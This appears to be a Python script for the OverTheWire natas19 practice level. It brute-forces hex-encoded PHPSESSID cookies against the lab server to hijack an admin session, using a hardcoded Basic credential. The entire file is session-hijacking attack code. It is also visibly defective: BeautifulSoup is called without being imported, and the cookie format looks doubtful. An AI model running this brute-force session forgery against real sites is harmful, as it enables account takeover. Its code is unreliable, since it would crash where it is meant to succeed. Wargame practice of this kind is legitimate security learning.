import requests

headers = {'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='}

url = 'http://natas19.natas.labs.overthewire.org/index.php'

for i in range(1, 641):
    r = requests.post(url, headers=headers, cookies={'PHPSESSID':'{}-{}'.format(i, i).encode().hex()})
    if 'next' in r.text: # the word next only appears in the response when you've successfully logged in
        
        soup = BeautifulSoup(r.text, 'html.parser')
        print(soup.find(id='content'))
        break